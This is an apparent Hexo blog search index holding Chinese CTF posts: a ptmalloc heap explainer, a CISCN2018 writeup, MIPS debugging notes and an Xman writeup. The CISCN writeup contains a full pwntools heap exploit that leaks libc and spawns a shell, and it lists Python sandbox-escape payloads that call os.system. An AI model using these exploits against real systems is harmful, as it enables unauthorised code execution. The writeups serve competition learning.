<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[堆学习（一）]]></title>
      <url>/2018/05/02/heap-study/</url>
      <content type="html"><![CDATA[<p><img src="/2018/05/02/heap-study/1.jpg" alt=""><br><a id="more"></a></p>
<h1 id="ptmalloc下堆的分配和回收"><a href="#ptmalloc下堆的分配和回收" class="headerlink" title="ptmalloc下堆的分配和回收"></a>ptmalloc下堆的分配和回收</h1><h2 id="ptmalloc内存分配"><a href="#ptmalloc内存分配" class="headerlink" title="ptmalloc内存分配"></a>ptmalloc内存分配</h2><p>1)  获取分配区的锁，为了防止多个线程同时访问同一个分配区，在进行分配之前需要取得分配区域的锁。线程先查看线程私有实例中是否已经存在一个分配区，如果存在尝试对该分配区加锁，如果加锁成功，使用该分配区分配内存，否则，该线程搜索分配区循环链表试图获得一个空闲（没有加锁）的分配区。如果所有的分配区都已经加锁，那么ptmalloc 会开辟一个新的分配区，把该分配区加入到全局分配区循环链表和线程的私有实例中并加锁，然后使用该分配区进行分配操作。开辟出来的新分配区一定为非主分配区，因为主分配区是从父进程那里继承来的。开辟非主分配区时会调用mmap()创建一个sub-heap，并设置好top chunk 。<br>2)  将用户的请求大小转换为实际需要分配的chunk 空间大小。<br>3)  判断所需分配chunk 的大小是否满足chunk_size &lt;= max_fast (max_fast  默认为  64B)， 如果是的话，则转下一步，否则跳到第5 步。<br>4)  首先尝试在fast  bins 中取一个所需大小的chunk 分配给用户。如果可以找到，则分配结束。否则转到下一步。<br>5)  判断所需大小是否处在small   bins  中，即判断chunk_size  &lt;  512B 是否成立。如果 chunk 大小处在small  bins 中，则转下一步，否则转到第6 步。<br>6)  根据所需分配的chunk 的大小，找到具体所在的某个small bin，从该bin 的尾部摘取一个恰好满足大小的chunk 。若成功，则分配结束，否则，转到下一步。<br>7)  到了这一步，说明需要分配的是一块大的内存，或者 small  bins中找不到合适的chunk。于是，ptmalloc 首先会遍历fast  bins 中的chunk，将相邻的chunk 进行合并，并链接到unsorted bin 中，然后遍历unsorted bin 中的chunk，如果unsorted bin 只有一个chunk，并且这个chunk 在上次分配时被使用过，并且所需分配的chunk 大小属于small  bins，并且chunk 的大小大于等于需要分配的大小，这种情况下就直接将该chunk 进行切割，分配结束，否则将根据chunk  的空间大小将其放入smallbins 或是large  bins 中，遍历完成后，转入下一步。<br>8)  到了这一步，说明需要分配的是一块大的内存，或者small  bins 和unsorted  bin 中都找不到合适的  chunk，并且fast  bins 和unsorted bin 中所有的chunk 都清除干净了。从large bins 中按照“smallest-first ，best-fit ”原则，找一个合适的  chunk，从中划分一块所需大小的chunk，并将剩下的部分链接回到bins 中。若操作成功，则分配结束，否则转到下一步。<br>9)  如果搜索fast  bins 和bins 都没有找到合适的chunk，那么就需要操作top chunk来<br>进行分配了。判断top  chunk 大小是否满足所需chunk  的大小，如果是，则从top chunk中分出一块来。否则转到下一步。<br>10)  到了这一步，说明top chunk 也不能满足分配要求，所以，于是就有了两个选择:<br>如果是主分配区，调用sbrk()，增加top chunk 大小；如果是非主分配区，调用mmap来分配一个新的sub-heap，增加top chunk 大小；或者使用mmap()来直接分配。在这里，需要依靠 chunk的大小来决定到底使用哪种方法。判断所需分配的 chunk大小是否大于等于mmap分配阈值，如果是的话，则转下一步，调用mmap 分配，否则跳到第12 步，增加top chunk的大小。<br>11)  使用mmap 系统调用为程序的内存空间映射一块chunk_size align 4kB 大小的空间。然后将内存指针返回给用户。<br>12)  判断是否为第一次调用malloc，若是主分配区，则需要进行一次初始化工作，分配一块大小为(chunk_size+128KB)align4KB大小的空间作为初始的heap。若已经初始化过了，主分配区则调用sbrk()增加heap空间，分主分配区则在topchunk中切割出一个chunk，使之满足分配需求，并将内存指针返回给用户。<br>总结一下：根据用户请求分配的内存的大小，ptmalloc有可能会在两个地方为用户分配内存空间。在第一次分配内存时，一般情况下只存在一个主分配区，但也有可能从父进程那里继承来了多个非主分配区，在这里主要讨论主分配区的情况，brk值等于start_brk，所以实际上heap大小为0，topchunk大小也是0。这时，如果不增加heap大小，就不能满足任何分配要求。所以，若用户的请求的内存大小小于mmap分配阈值，则ptmalloc会初始heap。然后在heap中分配空间给用户，以后的分配就基于这个heap进行。若第一次用户的请求就大于mmap分配阈值，则ptmalloc直接使用mmap()分配一块内存给用户，而heap也就没有被初始化，直到用户第一次请求小于mmap分配阈值的内存分配。第一次以后的分配就比较复杂了，简单说来，ptmalloc首先会查找fastbins，如果不能找到匹配的chunk，则查找smallbins。若还是不行，合并fastbins，把chunk加入unsortedbin，在unsortedbin中查找，若还是不行，把unsortedbin中的chunk全加入largebins中，并查找largebins。在fastbins和smallbins中的查找都需要精确匹配，而在largebins中查找时，则遵循“smallest-first，best-fit”的原则，不需要精确匹配。若以上方法都失败了，则ptmalloc会考虑使用topchunk。若topchunk也不能满足分配要求。而且所需chunk大小大于mmap分配阈值，则使用mmap进行分配。否则增加heap，增大topchunk。以满足分配要求。</p>
<h2 id="ptmalloc内存回收"><a href="#ptmalloc内存回收" class="headerlink" title="ptmalloc内存回收"></a>ptmalloc内存回收</h2><p>free()函数接受一个指向分配区域的指针作为参数，释放该指针所指向的chunk。而具体的释放方法则看该chunk所处的位置和该chunk的大小。free()函数的工作步骤如下：<br>1)   free()函数同样首先需要获取分配区的锁，来保证线程安全。<br>2)   判断传入的指针是否为0，如果为0，则什么都不做，直接return。否则转下一步。<br>3)   判断所需释放的chunk是否为mmapedchunk，如果是，则调用munmap()释放mmapedchunk，解除内存空间映射，该该空间不再有效。如果开启了mmap分配阈值的动态调整机制，并且当前回收的chunk大小大于mmap分配阈值，将mmap分配阈值设置为该chunk的大小，将mmap收缩阈值设定为mmap分配阈值的2倍，释放完成，否则跳到下一步。<br>4)   判断chunk的大小和所处的位置，若chunk_size&lt;=max_fast，并且chunk并不位于heap的顶部，也就是说并不与topchunk相邻，则转到下一步，否则跳到第6步。（因为与topchunk相邻的小chunk也和topchunk进行合并，所以这里不仅需要判断大小，还需要判断相邻情况）<br>5)   将chunk放到fastbins中，chunk放入到fastbins中时，并不修改该chunk使用状态位P。也不与相邻的chunk进行合并。只是放进去，如此而已。这一步做完之后释放便结束了，程序从free()函数中返回。<br>6)   判断前一个chunk是否处在使用中，如果前一个块也是空闲块，则合并。并转下一步。<br>7)   判断当前释放chunk的下一个块是否为topchunk，如果是，则转第9步，否则转下一步。<br>8)   判断下一个chunk是否处在使用中，如果下一个chunk也是空闲的，则合并，并将合并后的chunk放到unsortedbin中。注意，这里在合并的过程中，要更新chunk的大小，以反映合并后的chunk的大小。并转到第10步。<br>9)   如果执行到这一步，说明释放了一个与topchunk相邻的chunk。则无论它有多大，都将它与topchunk合并，并更新topchunk的大小等信息。转下一步。<br>10)  判断合并后的chunk的大小是否大于FASTBIN_CONSOLIDATION_THRESHOLD（默认64KB），如果是的话，则会触发进行fastbins的合并操作，fastbins中的chunk将被遍历，并与相邻的空闲chunk进行合并，合并后的chunk会被放到unsortedbin中。fastbins将变为空，操作完成之后转下一步。<br>11)  判断topchunk的大小是否大于mmap收缩阈值（默认为128KB），如果是的话，对于主分配区，则会试图归还topchunk中的一部分给操作系统。但是最先分配的128KB空间是不会归还的，ptmalloc会一直管理这部分内存，用于响应用户的分配请求；如果为非主分配区，会进行sub-heap收缩，将topchunk的一部分返回给操作系统，如果topchunk为整个sub-heap，会把整个sub-heap还回给操作系统。做完这一步之后，释放结束，从free()函数退出。可以看出，收缩堆的条件是当前free的chunk大小加上前后能合并chunk的大小大于64k，并且要topchunk的大小要达到mmap收缩阈值，才有可能收缩堆。</p>
]]></content>
      
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CISCN2018 Writeup]]></title>
      <url>/2018/04/30/wp-2018-ciscn/</url>
      <content type="html"><![CDATA[<p><img src="/2018/04/30/wp-2018-ciscn/0.jpg" alt=""></p>
<h1 id="The-Lounge战队-CISCN2018-Writeup"><a href="#The-Lounge战队-CISCN2018-Writeup" class="headerlink" title="The Lounge战队 CISCN2018 Writeup"></a>The Lounge战队 CISCN2018 Writeup</h1><a id="more"></a>
<h2 id="Pwn-Supermarket"><a href="#Pwn-Supermarket" class="headerlink" title="Pwn-Supermarket"></a>Pwn-Supermarket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def add(name,price,size,des):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)</span><br><span class="line">	p.sendlineafter(&quot;name:&quot;,name)</span><br><span class="line">	p.sendlineafter(&quot;price:&quot;,str(price))</span><br><span class="line">	p.sendlineafter(&quot;descrip_size:&quot;,str(size))</span><br><span class="line">	p.sendlineafter(&quot;description:&quot;,des)</span><br><span class="line"></span><br><span class="line">def listall():</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def delete(name):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;)</span><br><span class="line">	p.sendlineafter(&quot;name:&quot;,name)</span><br><span class="line"></span><br><span class="line">def change_price(name,price):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;4&quot;)</span><br><span class="line">	p.sendafter(&quot;name:&quot;,name)</span><br><span class="line">	p.sendlineafter(&quot;in:&quot;,str(price))</span><br><span class="line"></span><br><span class="line">def change_des(name,size,des):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;5&quot;)</span><br><span class="line">	p.sendlineafter(&quot;name:&quot;,name)</span><br><span class="line">	p.sendlineafter(&quot;descrip_size:&quot;,str(size))</span><br><span class="line">	p.sendlineafter(&quot;description:&quot;,des)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">atoi  0xf7643050  0xf75e4050</span><br><span class="line">puts  0xf75f4140  0xf7603140</span><br><span class="line">free  0xf765d750  0xf75af750</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">local=0</span><br><span class="line">if local:</span><br><span class="line">	p=process(&apos;./task_supermarket&apos;)</span><br><span class="line">	libc=ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line">	atoi_offset=libc.symbols[&apos;atoi&apos;]</span><br><span class="line">	sys_offset=libc.symbols[&apos;system&apos;]</span><br><span class="line">else:</span><br><span class="line">	p=remote(&apos;117.78.27.192&apos;,32285)</span><br><span class="line">	atoi_offset=0x2d050</span><br><span class="line">	sys_offset=0x3a940</span><br><span class="line"></span><br><span class="line">add(&apos;aaaa&apos;,100,0x50,&apos;A&apos;*0x50)</span><br><span class="line">add(&apos;1111&apos;,100,0x50,&apos;A&apos;*0x50)</span><br><span class="line">add(&apos;b&apos;*12+&apos;\x41&apos;,100,0x38,&apos;B&apos;*0x38)</span><br><span class="line">add(&apos;cccc&apos;,100,0x60,&apos;C&apos;*0x60)</span><br><span class="line">add(&apos;dddd&apos;,100,0x20,&apos;D&apos;*0x20)</span><br><span class="line">delete(&apos;b&apos;*12+&apos;\x41&apos;)</span><br><span class="line">change_des(&apos;cccc&apos;,0x20,&apos;M&apos;*0x24+p32(0x41))</span><br><span class="line"></span><br><span class="line">add(&apos;eeee&apos;,100,0x38,&apos;EEEE&apos;)</span><br><span class="line">add(&apos;ffff&apos;,100,0x38,p32(101)+p32(0x38)+p32(0x804b048)+p32(0x41))</span><br><span class="line">listall()</span><br><span class="line">p.recvuntil(&quot;101, des.&quot;)</span><br><span class="line"></span><br><span class="line">data=p.recv(4)</span><br><span class="line">print data</span><br><span class="line">atoi_addr=u32(data.ljust(4,&apos;\x00&apos;))</span><br><span class="line">print hex(atoi_addr)</span><br><span class="line"></span><br><span class="line">libc_base=atoi_addr-atoi_offset</span><br><span class="line">system=libc_base+sys_offset</span><br><span class="line">print &quot;system&quot;,hex(system)</span><br><span class="line"></span><br><span class="line">change_des(&apos;eeee&apos;,0x38,p64(system))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;/bin/sh\x00&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Web-EasyWeb"><a href="#Web-EasyWeb" class="headerlink" title="Web-EasyWeb"></a>Web-EasyWeb</h2><p>无力吐槽的题目，空密码。</p>
<p><img src="/2018/04/30/wp-2018-ciscn/1.png" alt="">  </p>
<p><img src="/2018/04/30/wp-2018-ciscn/2.png" alt="">  </p>
<h2 id="Crypto-Flag-in-your-hand"><a href="#Crypto-Flag-in-your-hand" class="headerlink" title="Crypto-Flag_in_your_hand"></a>Crypto-Flag_in_your_hand</h2><p>基本逻辑很简单，看showFlag函数。</p>
<p><img src="/2018/04/30/wp-2018-ciscn/3.png" alt="">  </p>
<p>判断ic状态来决定是否是正确Token。</p>
<p><img src="/2018/04/30/wp-2018-ciscn/4.png" alt="">  </p>
<p>文件唯一有改动ic的地方就是这了，看一下逻辑。就是a数组所有值-3转成ASCII字符就是正确Token。</p>
<p><img src="/2018/04/30/wp-2018-ciscn/5.png" alt="">  </p>
<h2 id="Misc-寻找入侵者"><a href="#Misc-寻找入侵者" class="headerlink" title="Misc-寻找入侵者"></a>Misc-寻找入侵者</h2><p>用mac地址爆破出honey密码</p>
<p><img src="/2018/04/30/wp-2018-ciscn/6.png" alt=""></p>
<p><img src="/2018/04/30/wp-2018-ciscn/7.png" alt="">    </p>
<p>然后使用airdecap-ng提取出另一个数据包，在包里面发现出题人博客以及key.rar的下载地址，下载后解压得到key.pcap，发现可疑字符串，即为flag</p>
<p><img src="/2018/04/30/wp-2018-ciscn/8.png" alt="">  </p>
<h2 id="Misc-Memory-Forensic"><a href="#Misc-Memory-Forensic" class="headerlink" title="Misc-Memory_Forensic"></a>Misc-Memory_Forensic</h2><p>很荣幸是三血。其实能更快。首先用IDA看一下逻辑。发现已经出现了”CISCN{“ “}” 和几个疑似flag的字符串，然后他会用snprintf去写内存，那么真flag应该会出现在内存中。<br>我是用的Vmware14配Mac OS High Siera，这样能拿到完整内存Dump。首先关闭System Integrity Protection，然后kextutil agent.kext加载，然后它会黑屏，在黑屏一瞬间切出去，暂停虚拟机。拿到整个内存Dump。然后用16进制编辑器搜索“CISCN{”就行。</p>
<p><img src="/2018/04/30/wp-2018-ciscn/9.png" alt="">  </p>
<h2 id="Misc-Picture"><a href="#Misc-Picture" class="headerlink" title="Misc-Picture"></a>Misc-Picture</h2><p>首先给了个假的PNG，其实是JPG。FFD9结尾处有数据，提出来，file一下发现是zlib数据，然后直接binwalk解压，给了个Base64字符串，解密后是KP什么的，还有Python code，当时想偏了，以为是PYC文件，修了半天发现格式全错。后来把头部改成PK，是个正常的ZIP文件。然后要密码。</p>
<p><img src="/2018/04/30/wp-2018-ciscn/10.png" alt="">  </p>
<p>注意右边注释，Python控制台报错？试一下。</p>
<p><img src="/2018/04/30/wp-2018-ciscn/11.png" alt="">  </p>
<p>没错，integer division or modulo by zero这是密码。成功解压后是个UUEncode，解密就行了。</p>
<h2 id="Misc-验证码"><a href="#Misc-验证码" class="headerlink" title="Misc-验证码"></a>Misc-验证码</h2><p>没啥好说的，签到题，进去就有flag。</p>
<h2 id="Misc-RUN"><a href="#Misc-RUN" class="headerlink" title="Misc-RUN"></a>Misc-RUN</h2><p>Python沙箱逃逸，试了很多Payload。所有的popen都会报unkonw error。所有的二阶<strong>dict</strong>也会报错，后来想到找一个<strong>globals</strong>。<br>x = [x for x in [].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>() if x.<strong>name</strong> == ‘ca’+’tch_warnings’][0].<strong>init</strong><br>x.<strong>getattribute</strong>(“func_global”+”s”)[‘linecache’].<strong>dict</strong>[‘o’+’s’].<strong>dict</strong><a href="&#39;l&#39;+&#39;s&#39;">‘sy’+’stem’</a><br>x.<strong>getattribute</strong>(“func_global”+”s”)[‘linecache’].<strong>dict</strong>[‘o’+’s’].<strong>dict</strong><a href="&#39;l&#39;+&#39;s /home/ctf&#39;">‘sy’+’stem’</a><br>x.<strong>getattribute</strong>(“func_global”+”s”)[‘linecache’].<strong>dict</strong>[‘o’+’s’].<strong>dict</strong><a href="&#39;ca&#39;+&#39;t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#39;">‘sy’+’stem’</a></p>
<h2 id="Reverse-RE"><a href="#Reverse-RE" class="headerlink" title="Reverse-RE"></a>Reverse-RE</h2><p>程序先检测flag格式头，然后根据“_”将内容分为三个部分，分别加密之后与字符串比较，前两个部分的内容很容易得到，解开md5值为tofu和gana，第三部分flag的MD5无法解开，卡了两三个小时，看到第三个函数与其他两个的区别是后面将大量数据写到一个叫“flag”的文件中，但是需要异或的两个key值，分别和数据奇数项和偶数项异或，因为看到第一个数据和第三个数据相同，猜测文件是jepg格式，果然解出来是张图片，连在一起即为完整flag.</p>
<p><img src="/2018/04/30/wp-2018-ciscn/12.png" alt="">  </p>
]]></content>
      
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mips程序调试]]></title>
      <url>/2018/04/30/mips/</url>
      <content type="html"><![CDATA[<p><img src="/2018/04/30/mips/1.jpg?height=428&amp;width=650" alt=""></p>
<h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>由于我们通常的操作系统指令集都是x86的，所以无法跑MIPS程序。这时候就需要装QEMU来模拟，QEMU通过源码编译较为复杂，我们又没有特殊的需求，所以直接使用ubuntu的APT进行安装即可。<br><a id="more"></a></p>
<ul>
<li>sudo apt install qemu</li>
</ul>
<p>由于MIPS架构有两种——大端MIPS和小端MIPS。所以，我们需要确定这个程序是大端MIPS还是小端MIPS。</p>
<ul>
<li>qemu-mips xxx   #大端</li>
<li>qemu-mipsel xxx #小端</li>
</ul>
<p>远程调试MIPS程序，所以要加上-g 端口参数，qemu-mipsel -g 1234 baby_mips，此时用IDA pro就可以通过Remote GDB Server来调试这个MIPS程序。</p>
<h1 id="0x02-反编译"><a href="#0x02-反编译" class="headerlink" title="0x02 反编译"></a>0x02 反编译</h1><p>为了方便我们了解key比对函数的功能，我们可以需要对MIPS进行反编译，目前可以反编译MIPS程序的工具有两个。</p>
<pre><code>Retdec
JEB-mips
</code></pre><p>Retdec有在线反编译网址，retdec.com，也可以通过python api接口使用，比较方便，需要注册获得YOUR-API-KEY，注意retdec-python包需要在python3环境下运行</p>
<pre><code>py 3 -m pip install retdec-python
</code></pre><p>python用法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from retdec.decompiler import Decompiler</span><br><span class="line"></span><br><span class="line">decompiler = Decompiler(api_key=&apos;YOUR-API-KEY&apos;)</span><br><span class="line">decompilation = decompiler.start_decompilation(input_file=&apos;file.exe&apos;)</span><br><span class="line">decompilation.wait_until_finished()</span><br><span class="line">decompilation.save_hll_code()</span><br></pre></td></tr></table></figure>
<p>或者命令行执行<br>    $ decompiler -k YOUR-API-KEY file.exe</p>
<pre><code>v23bmYb67R
----------

Waiting for resources (0%)...                    [OK]
Pre-Processing:
  Obtaining file information (5%)...             [OK]
  Unpacking (10%)...                             [OK]
Front-End:
  Initializing (20%)...                          [OK]
[..]
Done (100%)...

Downloading:
 - file.c
</code></pre><p>这样就会把mips程序反编译成c的代码写成file.c文件了。</p>
]]></content>
      
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Xman冬令营writeup]]></title>
      <url>/2018/01/07/wp-xmandly/</url>
      <content type="html"><![CDATA[<p><img src="/2018/01/07/wp-xmandly/tt.jpg" alt=""><br>做题一时爽，期末火葬场，一晚上水了三题，跪求期末不挂，老老实实去复习。祝各位表哥冬令营玩的开心。<br><a id="more"></a></p>
<h1 id="中二的成长之路"><a href="#中二的成长之路" class="headerlink" title="中二的成长之路"></a>中二的成长之路</h1><p><img src="/2018/01/07/wp-xmandly/1.jpg" alt=""><br>很容易发现图片本身就是个压缩包，里面还有个图片，但是加密了<br><img src="/2018/01/07/wp-xmandly/1.png" alt=""><br>所以需要我们求出压缩包的密码。<br>观察图片，有个二维码，扫描得到密文3ukka4wZf2Q9H8PEI5YKFA==<br>继续观察图片</p>
<ol>
<li>有红色字样，写着aes，说明是AES加密</li>
<li>有黑色加粗字样，写的QR，猜测key值与QR有关，后来根据题目提示，key应该是QR的MD5值<br>写脚本解密密文<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import binascii</span><br><span class="line">import base64</span><br><span class="line">obj2 = AES.new(&apos;66c35cd8077f7e1db5faefbc048a646a&apos;, AES.MODE_CBC,&apos;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&apos;)</span><br><span class="line">print obj2.decrypt(base64.b64decode(&apos;3ukka4wZf2Q9H8PEI5YKFA==&apos;))</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>得到压缩包密码1Znmpr4jzChwxXqB，解密压缩包，得到另一个二维码<br><img src="/2018/01/07/wp-xmandly/s776051080zum92N.jpg" alt=""><br>扫描得到密文bqIGBfOGuOsxLYV16OI7xRNAZrcFdYLJtHaDym2O7so=，<br>还是同样的套路，aes解密，其中aes的key是图片的名字s776051080zum92N，要注意的是这个密文包括了两段aes,分别解出XCTF{W0W_U_G0T_T和H3_FL4G}，连在一起就是flag。</p>
<h1 id="返老还童"><a href="#返老还童" class="headerlink" title="返老还童"></a>返老还童</h1><p>大概看一下源码，发现密文格式是xxxx-xxxx-xxxx-xxxx，根据’-‘符号把密文分成了四组。<br>先对密文做了检验，必须是大小写字母或数字。<br><img src="/2018/01/07/wp-xmandly/3.png" alt=""><br>主程序是一大段等式判断，把其中两位参数a、b传到check_flag.html并调用了o0O0oo0o0o0o0oO函数检验是不是满足条件，其中a要大于b，a小于100。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">  public static void b(String str) &#123;</span><br><span class="line">      String[] split = str.split(&quot;-&quot;);</span><br><span class="line">      char[] toCharArray = split[0].toCharArray();</span><br><span class="line">      char[] toCharArray2 = split[3].toCharArray();</span><br><span class="line">      if (toCharArray[0] == toCharArray2[1] - 3 &amp;&amp; </span><br><span class="line">toCharArray[3] == ((char) (toCharArray2[2] | 1)) &amp;&amp; </span><br><span class="line">toCharArray2[2] % 2 != 1) &#123;</span><br><span class="line">          a = toCharArray2[3] ^ 55; 91 108 l</span><br><span class="line">          if (toCharArray2[2] == toCharArray[2] + (toCharArray.length * 2) &amp;&amp; </span><br><span class="line">	toCharArray2[0] == toCharArray[0] - (toCharArray.length / 2) &amp;&amp; </span><br><span class="line">	toCharArray2[1] == ((char) (toCharArray[3] ^ 18)) &amp;&amp; </span><br><span class="line">	toCharArray[1] * 2 == toCharArray[2] - 8 &amp;&amp; </span><br><span class="line">	toCharArray2[3] == toCharArray[2]) &#123;</span><br><span class="line">              toCharArray = split[1].toCharArray();</span><br><span class="line">              toCharArray2 = split[2].toCharArray();</span><br><span class="line">              if ((split.length * 3) + toCharArray[1] == toCharArray[3] &amp;&amp; </span><br><span class="line">		toCharArray2[1] * 2 == toCharArray[3] - 11) &#123;</span><br><span class="line">                  b = (toCharArray[2] - toCharArray2.length) ^ 113;</span><br><span class="line">                  if (toCharArray[0] + toCharArray2[0] == 187 &amp;&amp; </span><br><span class="line">			toCharArray[0] + toCharArray2[3] == 210 &amp;&amp; </span><br><span class="line">			(toCharArray[3] ^ toCharArray[2]) == 47 &amp;&amp; </span><br><span class="line">			(toCharArray[0] ^ toCharArray[1]) == 15 &amp;&amp; </span><br><span class="line">			(toCharArray2[2] ^ toCharArray[1]) == 5 &amp;&amp; </span><br><span class="line">			a &gt; b &amp;&amp; </span><br><span class="line">			a &lt; 100) &#123;</span><br><span class="line">                      MainActivity.b.getSettings().setUserAgentString(MainActivity.b.getSettings().getUserAgentString() + &quot;;&quot; + a + &quot;;&quot; + b);</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">//d2lu-bmVy-Y7hp-bgtl</span><br><span class="line">//100-50-108-117</span><br><span class="line">//98-109-86-121</span><br><span class="line">//89-55-104-112</span><br><span class="line">//98-103-116-108</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/01/07/wp-xmandly/6.png" alt=""><br><img src="/2018/01/07/wp-xmandly/7.png" alt=""><br>观察check_flag.html函数，<br><img src="/2018/01/07/wp-xmandly/4.png" alt=""><br>主要需要满足的条件是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a*a-b*b=8(a+b)</span><br><span class="line">a-b=8</span><br><span class="line">a*a+a*b+b*b&gt;10000</span><br><span class="line">a*a+a*b-b*b&gt;10000</span><br><span class="line">gcd(a,b)=7</span><br></pre></td></tr></table></figure>
<p>,写脚本爆破，发现就一组满足条件<br><img src="/2018/01/07/wp-xmandly/5.png" alt=""><br>根据a,b的值带入程序方程组很容易就能求出所有密文的值d2lu-bmVy-Y7hp-bgtl，即为flag。</p>
<h1 id="神秘的TXT"><a href="#神秘的TXT" class="headerlink" title="神秘的TXT"></a>神秘的TXT</h1><p>发现有三个横坐标，三个纵坐标，因为是mobile题目，猜测对应着手机键盘密码。<br><img src="/2018/01/07/wp-xmandly/2.png" alt=""><br>因为不知道坐标顺序，所以把8种可能的反转情况都列出来，一个一个试，其中有一个是对的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">XCTF&#123;974856321&#125;</span><br><span class="line">XCTF&#123;932658741&#125;</span><br><span class="line">XCTF&#123;398652147&#125;</span><br><span class="line">XCTF&#123;178452369&#125;</span><br><span class="line">XCTF&#123;712458963&#125;</span><br><span class="line">XCTF&#123;314256987&#125;</span><br><span class="line">XCTF&#123;136254789&#125;</span><br><span class="line">XCTF&#123;796854123&#125;</span><br></pre></td></tr></table></figure></p>
<p>好像是第四个，忘了。  </p>
<embed src="http://www.xiami.com/widget/0_1317858/singlePlayer.swf" type="application/x-shockwave-flash" width="257" height="33" wmode="transparent">]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[实验报告合集]]></title>
      <url>/2017/12/16/ppsuc-sybg/</url>
      <content type="html"><![CDATA[<p><img src="https://tiaonmmn.github.io/uploads/avatar_doge.jpg" alt=""></p>
